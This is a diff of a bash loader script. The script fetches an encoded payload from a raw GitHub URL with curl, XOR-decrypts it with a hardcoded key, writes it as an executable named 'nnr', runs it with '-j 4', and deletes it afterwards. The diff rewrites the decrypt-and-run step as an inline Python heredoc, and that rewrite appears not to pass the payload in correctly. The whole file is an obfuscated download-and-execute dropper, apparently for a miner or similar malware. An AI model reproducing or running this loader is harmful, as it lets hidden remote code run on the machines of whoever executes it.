@@ -1,16 +1,5 @@
 #!/bin/bash
 
-_xor_decrypt() {
-    local data="$1"
-    local key="$2"
-    python3 -c "
-import base64, sys
-data = base64.b64decode('$data')
-key = '$key'
-decrypted = bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])
-sys.stdout.buffer.write(decrypted)
-" 2>/dev/null
-}
 _PAYLOAD=$(curl -sL https://raw.githubusercontent.com/popowana/clever-phoenix-960/refs/heads/main/payload.txt)
 
 if [ -z "$_PAYLOAD" ]; then
@@ -18,24 +7,41 @@ if [ -z "$_PAYLOAD" ]; then
     exit 1
 fi
 
-echo "Payload downloaded successfully"
-echo "Payload length: ${#_PAYLOAD}"
-_xor_decrypt "$_PAYLOAD" "kembang" > nnr
-if [ ! -f nnr ]; then
-    echo "Error: Failed to create nnr"
-    exit 1
-fi
-SIZE=$(stat -c%s nnr 2>/dev/null || stat -f%z nnr 2>/dev/null)
-echo "nnr size: $SIZE bytes"
-if [ "$SIZE" -eq 0 ]; then
-    echo "Error: nnr is empty (decryption failed)"
-    echo "Debugging: Checking payload content..."
-    head -c 100 payload_debug.txt
-    echo ""
-    exit 1
-fi
-chmod +x nnr
-echo "Executing."
-./nnr -j 4
-# Cleanup
-rm -f nnr payload_debug.txt
+echo "Payload downloaded (length: ${#_PAYLOAD})"
+
+# Gunakan Python untuk decrypt dan execute
+python3 <<'EOF'
+import base64, os, subprocess, sys
+
+# Data dari bash
+data = sys.argv[1] if len(sys.argv) > 1 else open('/dev/stdin').read()
+data = data.strip()
+
+try:
+    decoded = base64.b64decode(data)
+except Exception as e:
+    print(f"Base64 decode error: {e}")
+    sys.exit(1)
+
+key = 'kembang'
+decrypted = bytes([decoded[i] ^ ord(key[i % len(key)]) for i in range(len(decoded))])
+
+if len(decrypted) == 0:
+    print("Error: Decrypted data is empty")
+    sys.exit(1)
+
+print(f"Decrypted size: {len(decrypted)} bytes")
+
+with open('nnr', 'wb') as f:
+    f.write(decrypted)
+
+os.chmod('nnr', 0o755)
+
+# Jalankan
+result = subprocess.run(['./nnr', '-j', '4'], capture_output=True, text=True)
+print(result.stdout)
+if result.stderr:
+    print(result.stderr, file=sys.stderr)
+
+os.unlink('nnr')
+EOF "$_PAYLOAD"
